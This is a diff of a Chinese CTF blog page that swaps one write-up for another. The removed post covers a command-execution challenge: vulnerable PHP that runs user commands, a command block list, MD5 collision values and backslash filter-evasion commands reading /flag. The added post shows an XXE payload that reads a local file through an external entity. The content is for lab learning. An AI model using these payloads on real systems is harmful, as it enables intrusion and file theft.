@@ -4,15 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="东塔靶场-CTF-命令执行_2, 小白">
-    <meta name="description" content="前言东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。
-0x00打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过
+    <meta name="keywords" content="BUU-XXE, 小白">
+    <meta name="description" content="0x00BUU一道基础XXE题目。
+0x01打开靶场出现登录界面：
 
-查看源码，最可疑的是这张图片的地址，base64加密
-
-先解码，得到是dota.png这张图片
-
-">
+随便登录抓包观察数据包：
+发现数据包中有xml 文档声明：
+&amp;lt;?xml version&amp;#x3D;&amp;quot;1.0&amp;quot; encoding&amp;#x3D;&amp;qu">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +22,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>东塔靶场-CTF-命令执行_2 | 小白</title>
+    <title>BUU-XXE | 小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -326,12 +324,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">东塔靶场-CTF-命令执行_2</h1>
+                    <h1 class="description center-align post-title">BUU-XXE</h1>
                 </div>
             </div>
         </div>
@@ -451,6 +449,10 @@
                                 <span class="chip bg-color">CTF</span>
                             </a>
                         
+                            <a href="/tags/XXE/">
+                                <span class="chip bg-color">XXE</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -459,8 +461,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/XXE/" class="post-category">
+                                XXE
                             </a>
                         
                     </div>
@@ -472,7 +474,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-03-16
+                    2022-07-19
                 </div>
                 
 
@@ -481,7 +483,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    382
                 </div>
                 
 
@@ -506,189 +508,39 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。</p>
-<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316085212437.png" alt="image-20220316085212437"></p>
-<p>查看源码，最可疑的是这张图片的地址，base64加密</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316085328265.png" alt="image-20220316085328265"></p>
-<p>先解码，得到是<code>dota.png</code>这张图片</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316090806061.png" alt="image-20220316090806061"></p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先将url解码试试</p>
-<pre class="line-numbers language-none"><code class="language-none">解码前：TmpRMlpqYzBOakV5WlRjd05tVTJOdz09
-解码后：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+                <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>BUU一道基础XXE题目。</p>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>打开靶场出现登录界面：</p>
+<p><img src="/2022/07/19/BUU-XXE/image-20220719215715674.png" alt="image-20220719215715674"></p>
+<p>随便登录抓包观察数据包：<br><img src="/2022/07/19/BUU-XXE/image-20220719215812408.png" alt="image-20220719215812408"></p>
+<p>发现数据包中有xml 文档声明：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>解码后又是一个base64，再进行解码</p>
-<pre class="line-numbers language-none"><code class="language-none">解码前：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;
-解码后：646f74612e706e67<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>因此，可能存在xxe漏洞。</p>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>构造payload：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+]&gt;
+&lt;root&gt;
+&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;
+&lt;password&gt;2333&lt;&#x2F;password&gt;
+&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>看着像16进制编码后的结果，试试16进制解码</p>
-<pre class="line-numbers language-none"><code class="language-none">解码前：646f74612e706e67
-解码后：dota.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>其中：</p>
+<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;    &lt;!--使用admin实体--&gt;
+&lt;!DOCTYPE root[
+&lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;
+]&gt;                        &lt;!--声明admin实体--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>解码完之后是<code>dotd.png</code>这张图片。</p>
-<pre class="line-numbers language-none"><code class="language-none">那这里的逻辑应该是这样的：
-dota.png这张图片被三次编码之后放入地址栏中被解析成一张图片，结合上面将源码中的图片地址进行base64解码之后得到的正好是dota.png,那这里就不难理解了：url中将图片三次编码后，最后又被解析成了源码中的链接；而这里我们正好需要知道源码，那将index.php逆向的进行编码然后放入地址栏中，源码中就会出现index.php的源码链接，解码之后就是源码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>将<code>index.php</code>进行逆向三次加密</p>
-<pre class="line-numbers language-none"><code class="language-none">十六进制：696e6465782e706870
-第一次base64加密：Njk2ZTY0NjU3ODJlNzA2ODcw
-第二次base64加密：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p> 然后将最终编码后的<code>index.php</code>放入地址栏中进行解析</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316091829007.png" alt="image-20220316091829007"></p>
-<p>打开源码，复制<code>index.php</code>的链接进行base64解码</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316091946741.png" alt="image-20220316091946741"></p>
-<p>得到源代码</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316092031938.png" alt="image-20220316092031938"></p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>将源码复制出来，进行代码审计</p>
-<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;
-&lt;!--[if lt IE 7]&gt; &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8 lt-ie7&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;
-&lt;!--[if IE 7]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;
-&lt;!--[if IE 8]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;
-&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html class&#x3D;&quot;no-js&quot; lang&#x3D;&quot;en&quot;&gt; &lt;!--&lt;![endif]--&gt;
-&lt;head&gt;
-  &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;
-  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width&quot; &#x2F;&gt;
-  &lt;title&gt;dongta xueyuan&lt;&#x2F;title&gt;  
-  &lt;!-- Included CSS Files (Uncompressed) --&gt;
-  &lt;!--
-  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;stylesheets&#x2F;foundation.css&quot;&gt;
-  --&gt;  
-  &lt;!-- Included CSS Files (Compressed) --&gt;
- 
-  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;foundation.min.css&quot;&gt;
-  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;app.css&quot;&gt;
-  &lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;.&#x2F;dt.png&quot; type&#x3D;&quot;image&#x2F;x-icon&quot;&gt;
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;modernizr.foundation.js&quot;&gt;&lt;&#x2F;script&gt;
-  &lt;!-- IE Fix for HTML5 Tags --&gt;
-  &lt;!--[if lt IE 9]&gt;
-    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;html5shiv.googlecode.com&#x2F;svn&#x2F;trunk&#x2F;html5.js&quot;&gt;&lt;&#x2F;script&gt;
-  &lt;![endif]--&gt;
-  &lt;link href&#x3D;&#39;http:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;Open+Sans&#39; rel&#x3D;&#39;stylesheet&#39; type&#x3D;&#39;text&#x2F;css&#39;&gt;
-&lt;&#x2F;head&gt;
-&lt;body&gt;
-&lt;div class&#x3D;&quot;row&quot;&gt;
-	&lt;div class&#x3D;&quot;four columns centered&quot;&gt;
-		&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;img src&#x3D;&quot;images&#x2F;dota.png&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;p&gt;
-		&lt;fieldset&gt;
-		 &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;
-        .org12
-        &#123;
-            color: #f60;
-        &#125;
-        .grey12
-        &#123;
-            color: #989898;
-        &#125;
-    &lt;&#x2F;style&gt;
-
- 
-
-&lt;font class&#x3D;&quot;org12&quot;&gt;★★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;&lt;&#x2F;font&gt;
-			&lt;legend&gt;Details&lt;&#x2F;legend&gt;
-&lt;?php
-error_reporting(E_ALL || ~ E_NOTICE);
-header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);
-$cmd &#x3D; $_GET[&#39;cmd&#39;];
-if (!isset($_GET[&#39;tup&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
-    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?tup&#x3D;TmpRMlpqYzBOakV5WlRjd05tVTJOdz09&amp;cmd&#x3D;&#39;);
-$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;tup&#39;])));
-
-$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);
-if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;
-    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;
-    die(&quot;这里没有flag&quot;);
-&#125; else &#123;
-    $txt &#x3D; base64_encode(file_get_contents($file));
-    echo &quot;&lt;br&#x2F;&gt;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;
-    echo &quot;&lt;br&gt;&quot;;
-&#125;
-echo $cmd;
-echo &quot;&lt;br&gt;&quot;;
-if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;
-    echo(&quot;forbid ~&quot;);
-    echo &quot;&lt;br&gt;&quot;;
-&#125; else &#123;
-    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;
-        echo &#96;$cmd&#96;;
-    &#125; else &#123;
-        echo (&quot;有趣的md5&quot;);
-    &#125;
-&#125;
-
-?&gt;
-
-&lt;&#x2F;div&gt;  
-  &lt;!-- Included JS Files (Uncompressed) --&gt;
-  &lt;!--  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.mediaQueryToggle.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.forms.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.reveal.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.orbit.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.navigation.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.buttons.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tabs.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.tooltips.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.accordion.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.placeholder.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.alerts.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.topbar.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.joyride.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.clearing.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.foundation.magellan.js&quot;&gt;&lt;&#x2F;script&gt;  
-  --&gt;  
-  &lt;!-- Included JS Files (Compressed) --&gt;
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;jquery.js&quot;&gt;&lt;&#x2F;script&gt;
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;foundation.min.js&quot;&gt;&lt;&#x2F;script&gt;  
-  &lt;!-- Initialize JS Plugins --&gt;
-  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;app.js&quot;&gt;&lt;&#x2F;script&gt;  
-&lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>可以看到，很多命令都被过滤了</p>
-<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;
-    echo(&quot;forbid ~&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>但只要符合下面的条件就可以执行命令</p>
-<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;
-       echo &#96;$cmd&#96;;
-   &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p><strong>这里绕过MD5函数的比较，又因为强行进行了string转换，所以我们这里不能进行数组绕过md5；所以这里需要构造出满足这样条件的md5；</strong></p>
-<p>POST：</p>
-<pre class="line-numbers language-none"><code class="language-none">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
-&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>由于过滤了很多命令，但查看目录的命令<code>dir</code>没有被禁用；查看一下当前目录有没有flag：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?cmd&#x3D;dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316094902981.png" alt="image-20220316094902981"></p>
-<p>当前目录中没有flag，去根目录找一下flag：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?cmd&#x3D;dir%20&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316095044884.png" alt="image-20220316095044884"></p>
-<p>有flag文件。</p>
-<p>读取flag，由于<code>cat</code>被禁用了，但在linux命令中可以加反斜杠<code>(\)</code>进行逃逸：</p>
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316095657940.png" alt="image-20220316095657940"></p>
-<p>得到flag。</p>
-<p>或者可以使用sort /flag进行读取：<br><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316095907910.png" alt="image-20220316095907910"></p>
-<p>（Linux sort命令用于将文本文件内容加以排序。）</p>
-<p>查看目录也可以使用反斜杠<code>(\)</code>逃逸：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;index.php?cmd&#x3D;l\s%20&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316100108501.png" alt="image-20220316100108501"></p>
-<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这里难点主要在于MD5的强类型绕过；linux命令的熟悉程度和反斜杠逃逸。</p>
+<p>在这里 usename 和 password 都存在 xxe 漏洞，所以两者之间 都可以进行 xxe 注入。</p>
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。<br>因此，在这里我们利用 这一特性 我们在向服务器上传的文档中 使用外部实体 (通过<strong>引用</strong>定义在<strong>外部的 DTD 中的实体</strong>，我们称之为外部实体) 来访问我们 的 flag；</p>
+<p>我们在使用外部实体访问的时候，会对我们访问的文件进行检查是否为 dtd 文件，此时如果没有检测的话，就可以引用非dtd文件造成漏洞，这就是xxe漏洞。</p>
+</blockquote>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>执行payload得到flag：    </p>
+<p><img src="/2022/07/19/BUU-XXE/image-20220719220251958.png" alt="image-20220719220251958"></p>
 <p>参考文章：</p>
-<p>浅谈MD5强类型碰撞：</p>
-<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1691028605507773400&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1691028605507773400&amp;wfr=spider&amp;for=pc</a></p>
-<p>MD5强类型绕过：</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43332695/article/details/119349204">https://blog.csdn.net/weixin_43332695/article/details/119349204</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/123750846">https://blog.csdn.net/m0_62879498/article/details/123750846</a></p>
 
                 
             </div>
@@ -715,7 +567,7 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://NoobXW.github.io/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/">http://NoobXW.github.io/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/</a>
+                    <a href="http://NoobXW.github.io/2022/07/19/BUU-XXE/">http://NoobXW.github.io/2022/07/19/BUU-XXE/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -755,6 +607,10 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                             
                                 <a href="/tags/CTF/">
                                     <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/XXE/">
+                                    <span class="chip bg-color">XXE</span>
                                 </a>
                             
                         </div>
@@ -806,13 +662,13 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/">
+                <a href="/2022/07/21/SSRF%E9%9D%B6%E5%9C%BA/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="BUU-SQL注入-寻找注入点">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="SSRF靶场">
                         
-                        <span class="card-title">BUU-SQL注入-寻找注入点</span>
+                        <span class="card-title">SSRF靶场</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -823,14 +679,14 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>22-03-18
+                            <i class="far fa-clock fa-fw icon-date"></i>22-07-21
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
-                                    SQL注入
+                            <a href="/categories/SSRF/" class="post-category">
+                                    SSRF
                                 </a>
                             
                             
@@ -844,8 +700,8 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                         <span class="chip bg-color">CTF</span>
                     </a>
                     
-                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
-                        <span class="chip bg-color">SQL注入</span>
+                    <a href="/tags/SSRF/">
+                        <span class="chip bg-color">SSRF</span>
                     </a>
                     
                 </div>
@@ -859,13 +715,13 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web-backup/">
+                <a href="/2022/07/19/BUU-CODE-REVIEW/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="攻防世界-web-backup">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="BUU-CODE-REVIEW">
                         
-                        <span class="card-title">攻防世界-web-backup</span>
+                        <span class="card-title">BUU-CODE-REVIEW</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -876,14 +732,14 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>22-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>22-07-19
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                    反序列化
                                 </a>
                             
                             
@@ -893,8 +749,8 @@ if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|gre
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
                     </a>
                     
                 </div>
